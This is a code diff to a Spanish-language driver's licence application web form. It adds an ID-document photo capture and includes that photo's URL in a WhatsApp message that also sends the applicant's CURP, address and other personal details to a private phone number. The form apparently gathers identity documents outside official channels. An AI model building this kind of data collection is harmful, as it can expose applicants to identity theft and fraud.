@@ -23,6 +23,15 @@
         <img id="final-photo" />
     </div>
 
+    <label>* FOTO DE IDENTIFICACIÓN (INE / DOCUMENTO)</label>
+<button class="btn-camera" onclick="openCameraDoc()">Tomar foto del documento</button>
+<input type="hidden" id="foto_documento_url">
+
+<div id="photo-preview-doc" class="photo-preview" style="display:none;">
+    <p>Documento cargado correctamente</p>
+    <img id="final-photo-doc" />
+</div>
+    
     <div class="section-title admin-trigger">DATOS PERSONALES</div>
 
     <label>* TELÉFONO (WHATSAPP)</label>
@@ -231,7 +240,7 @@ function enviarWhatsApp() {
     const t = id => document.getElementById(id).value.trim();
 
     const campos = [
-        "foto_url","telefono","tipo_licencia","valida_por",
+        "foto_url","foto_documento_url","telefono","tipo_licencia","valida_por",
         "nombre","curp","domicilio","alergias","sangre",
         "emergencia_nombre","emergencia_tel",
         "dest_nombre","dest_tel","calle","numero_ext","colonia","cp","ciudad","estado"
@@ -246,8 +255,6 @@ function enviarWhatsApp() {
     const mensaje = `
 SOLICITUD LICENCIA DE CONDUCIR
 Folio #${folio}
-
-FOTO: ${t("foto_url")}
 
 TELÉFONO: ${t("telefono")}
 TIPO DE LICENCIA: ${t("tipo_licencia")}
@@ -267,6 +274,9 @@ NÚMERO : ${t("numero_ext")}
 COLONIA : ${t("colonia")}
 CP : ${t("cp")}
 CIUDAD Y ESTADO : ${t("ciudad")}, ${t("estado")}
+
+FOTO: ${t("foto_url")}
+FOTO DEL DOCUMENTO: ${t("foto_documento_url")}
 
 Tu solicitud será asignada al número 7225600905 para continuar el trámite.
 `;
